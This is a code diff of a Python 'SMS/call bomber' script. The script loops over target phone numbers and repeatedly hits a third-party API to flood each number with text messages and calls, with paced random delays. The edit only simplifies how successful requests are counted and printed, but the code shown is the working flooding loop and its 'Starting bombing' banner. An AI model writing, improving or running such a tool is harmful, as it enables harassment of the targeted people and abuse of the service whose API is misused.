@@ -56,12 +56,10 @@ def send_request(phone, request_type):
         response = requests.get(url, params=params, headers=headers, timeout=10)
         print(f"{Colors.YELLOW}Debug: Raw API response for {request_type.upper()} to {phone}: {response.text}{Colors.RESET}")
         if response.status_code == 200:
-            # Assume 10 messages for SMS, 1 for Call (adjust if API response provides exact count)
-            messages_sent = 10 if request_type == "sms" else 1
-            return {"success": True, "status": "Success", "messages_sent": messages_sent}
-        return {"success": False, "status": f"Unsuccessful: HTTP {response.status_code}", "messages_sent": 0}
+            return {"success": True, "status": "Success"}
+        return {"success": False, "status": f"Unsuccessful: HTTP {response.status_code}"}
     except requests.RequestException as e:
-        return {"success": False, "status": f"Unsuccessful: {str(e)}", "messages_sent": 0}
+        return {"success": False, "status": f"Unsuccessful: {str(e)}"}
 
 def main():
     clear_screen()
@@ -106,7 +104,7 @@ def main():
     total_requests_per_number = sms_count + call_count
     total_requests = total_requests_per_number * len(phone_numbers)
     print(f"\n{Colors.YELLOW}Starting bombing to {len(phone_numbers)} numbers with {sms_count} SMS requests and {call_count} call requests per number (delay: {delay}s)...{Colors.RESET}")
-    print(f"{Colors.YELLOW}Note: Each SMS request may trigger 10 messages; each Call request triggers 1 call.{Colors.RESET}")
+    print(f"{Colors.YELLOW}Note: Each SMS request may trigger multiple messages (e.g., 10 SMS).{Colors.RESET}")
 
     request_counter = 0
     for phone in phone_numbers:
@@ -119,9 +117,7 @@ def main():
             request_counter += 1
             result = send_request(phone, request_type)
             if result["success"]:
-                # Show "Success" for each message sent (10 for SMS, 1 for Call)
-                for i in range(result["messages_sent"]):
-                    print(f"{Colors.GREEN}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): Success #{i+1}/{result['messages_sent']}{Colors.RESET}")
+                print(f"{Colors.GREEN}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): Success{Colors.RESET}")
             else:
                 print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
             time.sleep(delay + random.uniform(0, 1))
